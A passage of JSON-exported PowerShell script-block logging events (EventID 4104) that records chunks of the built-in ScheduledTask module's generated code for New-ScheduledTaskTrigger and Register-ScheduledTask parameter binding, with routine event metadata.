'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.",
    "ScriptBlockId": "97e25639-7cba-4b4f-a31d-9b0148eac352",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:19.991331Z"
    },
    "EventRecordID": 35,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-17A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 12,
    "MessageTotal": 19,
    "ScriptBlockText": "MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('NewTriggerByStartup', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Weekly') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RandomDelay')) {\r\n          [object]$__cmdletization_value = ${RandomDelay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomDelay'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomDelay'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DaysOfWeek')) {\r\n          [object]$__cmdletization_value = ${DaysOfWeek}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DaysOfWeek'; ParameterType = 'System.DayOfWeek[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DaysOfWeek'; ParameterType = 'System.DayOfWeek[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Weekly')) {\r\n          [object]$__cmdletization_value = ${Weekly}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Weekly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Weekly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('WeeksInterval')) {\r\n          [object]$__cmdletization_value = ${WeeksInterval}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'WeeksInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'WeeksInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('At')) {\r\n          [object]$__cmdletization_value = ${At}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'At'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'At'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('NewTriggerByWeekly', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'New-ScheduledTaskTrigger' -Alias '*'\r\n        \r\n\r\nfunction Register-ScheduledTask\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='User', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Principal')]\r\n    [Parameter(ParameterSetName='User')]\r\n    [Parameter(ParameterSetName='Xml')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${Force},\r\n\r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=2, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Object', Position=4)]\r\n    [Parameter(ParameterSetName='User', Position=6)]\r\n    [Parameter(ParameterSetName='Xml', Position=4)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Password},\r\n\r\n    [Parameter(ParameterSetName='Object', Position=3)]\r\n    [Parameter(ParameterSetName='User', Position=5)]\r\n    [Parameter(ParameterSetName='Xml', Position=3)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${User},\r\n\r\n    [Parameter(ParameterSetName='Object', Position=0)]\r\n    [Parameter(ParameterSetName='Principal', Mandatory=$true, Position=0)]\r\n    [Parameter(ParameterSetName='User', Mandatory=$true, Position=0)]\r\n    [Parameter(ParameterSetName='Xml', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Object', Position=1)]\r\n    [Parameter(ParameterSetName='Principal', Position=1)]\r\n    [Parameter(ParameterSetName='User', Position=1)]\r\n    [Parameter(ParameterSetName='Xml', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskPath},\r\n\r\n    [Parameter(ParameterSetName='Principal', Position=5)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskPrincipal')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${Principal},\r\n\r\n    [Parameter(ParameterSetName='Principal', Mandatory=$true, Position=2)]\r\n    [Parameter(ParameterSetName='User', Mandatory=$true, Position=2)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance[]]\r\n    ${Action},\r\n\r\n    [Parameter(ParameterSetName='Principal', Position=6)]\r\n    [Parameter(ParameterSetName='User', Position=8)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Description},\r\n\r\n    [Parameter(ParameterSetName='Principal', Position=4)]\r\n    [Parameter(ParameterSetName='User', Position=4)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${Settings},\r\n\r\n    [Parameter(ParameterSetName='Principal', Position=3)]\r\n    [Parameter(ParameterSetName='User', Position=3)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance[]]\r\n    ${Trigger},\r\n\r\n    [Parameter(ParameterSetName='User', Position=7)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.RunLevelEnum]\r\n    ${RunLevel},\r\n\r\n    [Parameter(ParameterSetName='Xml', Mandatory=$true, Position=2, ValueFromPipeline=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Xml},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Principal')]\r\n    [Parameter(ParameterSetName='User')]\r\n    [Parameter(ParameterSetName='Xml')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Principal')]\r\n    [Parameter(ParameterSetName='User')]\r\n    [Parameter(ParameterSetName='Xml')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Princi",
    "ScriptBlockId": "97e25639-7cba-4b4f-a31d-9b0148eac352",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:19.991340Z"
    },
    "EventRecordID": 36,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-17A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 13,
    "MessageTotal": 19,
    "ScriptBlockText": "pal')]\r\n    [Parameter(ParameterSetName='User')]\r\n    [Parameter(ParameterSetName='Xml')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Object') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Force')) {\r\n          [object]$__cmdletization_value = ${Force}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n          [object]$__cmdletization_value = ${InputObject}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Password')) {\r\n          [object]$__cmdletization_value = ${Password}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Password'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Password'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('User')) {\r\n          [object]$__cmdletization_value = ${User}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('RegisterByObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Principal') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Force')) {\r\n          [object]$__cmdletization_value = ${Force}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Principal')) {\r\n          [object]$__cmdletization_value = ${Principal}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Principal'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Principal'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskPrincipal'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Action')) {\r\n          [object]$__cmdletization_value = ${Action}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Description')) {\r\n         ",
    "ScriptBlockId": "97e25639-7cba-4b4f-a31d-9b0148eac352",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:19.991349Z"
    },
    "EventRecordID": 37,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-17A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 14,
    "MessageTotal": 19,
    "ScriptBlockText": " [object]$__cmdletization_value = ${Description}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Settings')) {\r\n          [object]$__cmdletization_value = ${Settings}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Trigger')) {\r\n          [object]$__cmdletization_value = ${Trigger}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        